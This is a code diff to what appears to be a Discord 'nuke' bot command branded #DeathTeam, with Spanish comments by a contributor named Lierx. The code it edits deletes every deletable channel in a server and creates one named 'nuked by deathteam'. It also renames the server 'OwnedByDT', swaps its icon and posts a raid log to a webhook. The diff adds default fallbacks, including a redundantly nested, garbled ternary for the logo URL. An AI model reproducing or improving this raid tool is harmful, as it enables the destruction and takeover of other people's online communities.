@@ -30,7 +30,7 @@ async execute(client, message, args){
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" !== "SERVER LOGO" ? util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
                          },
                          footer: {
                               text: '#DeathTeam',
@@ -40,21 +40,25 @@ async execute(client, message, args){
                          }
                     ]
           }
-          
-          fetch(util.webhook_url, {
-               method: 'POST',
-               headers: {
-                    'Content-type': 'application/json'
-               },
-               body: JSON.stringify(log)
-          });
+
+          if (util.webhook_url !== "WEBHOOK") {
+               fetch(util.webhook_url, {
+                    method: 'POST',
+                    headers: {
+                         'Content-type': 'application/json'
+                    },
+                    body: JSON.stringify(log)
+               });
+          } else {
+               console.error(chalk.red(`\n[ BATNET ] Could not send log, Webhook not configured, configure it at: utilities\\ignore.json\n`));
+          }
           
           message.delete();
           
           for (const channel of message.guild.channels.cache.filter(channel => channel.deletable).array()) {
                channel.delete();
           }
-          message.guild.channels.create(util.nuke_channel, {
+          message.guild.channels.create(util.nuke_channel !== "NUKE CHANNEL" ? util.nuke_channel : "nuked by deathteam", {
                type: 'text'
           }).then(channel => {
                const embed = new Discord.MessageEmbed();
@@ -68,7 +72,8 @@ async execute(client, message, args){
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" !== "SERVER LOGO" ? util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
+                              // [ Lierx ] Si el valor de util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" es igual a "SERVER LOGO", osea el valor Default, para evitar errores lo reemplaza por una url valida.
                          },
                          footer: {
                               text: '#DeathTeam',
@@ -80,8 +85,10 @@ async execute(client, message, args){
 
           });
       
-      message.guild.setName(util.server_name);
-      message.guild.setIcon(util.server_logo);
+      message.guild.setName(util.server_name !== "SERVER NAME" ? util.server_name : "OwnedByDT");
+      // [ Lierx ] Asi se ve mejor si a alguien se le olvida configurar todo o le da paja
+      message.guild.setIcon(util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless")
+      // [ Lierx ] Si el valor de util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless" es igual a "SERVER LOGO", osea el valor Default, para evitar errores lo reemplaza por una url valida.
      }, 5000);
 }
 }
